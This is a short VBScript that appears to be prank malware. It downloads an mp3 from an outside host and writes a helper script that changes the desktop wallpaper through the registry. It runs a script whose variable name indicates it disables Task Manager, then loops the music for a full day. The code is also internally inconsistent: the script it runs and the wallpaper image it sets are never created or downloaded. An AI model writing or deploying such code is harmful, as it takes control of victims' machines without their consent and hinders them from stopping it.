Dim wshNetwork : Set wshNetwork = CreateObject("WScript.Network")
Dim strUsername : strUsername = wshNetwork.UserName

'Get music data
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://pwcreatures.vercel.app/bin/music.mp3", False
xHttp.Send
with bStrm
    .type = 1 
    .open
    .write xHttp.responseBody
    .savetofile "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3", 2 
end with

'Set subfolder for changing desktop image
Set objFSO = CreateObject("Scripting.FileSystemObject")
strUsername = CreateObject("WScript.Network").UserName
strFolder = "C:\Users\" & strUsername & "\Downloads"
strFile = strFolder & "\LemonZS.vbs"
lines = Array( _
    "Set objShell = CreateObject(""WScript.Shell"")", _
    "Dim wshNetwork : Set wshNetwork = CreateObject(""WScript.Network"")", _
    "Dim strUsername : strUsername = wshNetwork.UserName", _
    "strLocalPath = ""C:\Users\" & strUsername & "\Downloads\LemonZS.jpg""", _
    "objShell.RegWrite ""HKCU\Control Panel\Desktop\Wallpaper"", strLocalPath", _
    "WScript.Sleep 10000", _
    "objShell.Run ""%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters"", 1, True" _
)
Set objFile = objFSO.CreateTextFile(strFile, True)
For Each line In lines
    objFile.WriteLine line
Next
objFile.Close
Set objFSO = Nothing

'Run Music
WScript.Sleep 2000
Dim objShell
Set objShell = CreateObject("WScript.Shell")
strProfileFolder = objShell.ExpandEnvironmentStrings("%UserProfile%")
strPath = strProfileFolder & "\Downloads\LemonZS.vbs"
strDisableTaskManager = strProfileFolder & "\Downloads\LemonZST.vbs"
Set objNetwork = CreateObject("WScript.Network")
strUsername = objNetwork.UserName

objShell.Run strDisableTaskManager
objShell.Run strDisableTaskManager


'WScript.Echo "Desktop wallpaper matches: C:\Users\" & strUsername & "\Downloads\LemonZS.jpg"
Set objShell = Nothing
'Set music
Set objShell = CreateObject("WScript.Shell")
Set objWMPlayer = CreateObject("WMPlayer.OCX")
strMusicPath = "C:\Users\" & strUsername & "\Downloads\LemonZS.mp3"
objWMPlayer.URL = strMusicPath
objWMPlayer.settings.setMode "loop", True
objWMPlayer.settings.setMode "autoRewind", True
objWMPlayer.controls.play
WScript.Sleep 86400000
Set objShell = Nothing
Set objWMPlayer = Nothing